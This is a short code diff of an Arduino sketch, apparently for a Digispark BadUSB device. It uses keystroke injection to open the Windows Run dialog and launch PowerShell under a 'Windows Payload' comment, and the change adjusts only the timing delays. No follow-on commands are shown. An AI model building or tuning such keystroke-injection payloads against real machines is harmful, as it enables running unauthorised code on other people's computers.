@@ -15,8 +15,9 @@ void setup() {
 void loop() {
   DigiKeyboard.sendKeyStroke(0); //initialization
   //Windows Payload
+  delay(10000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // press windowsKey+R opens Run
-  delay(1000);
+  delay(5000);
   DigiKeyboard.print("powershell"); // write powershell 
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // opens powershell
   delay(1000);
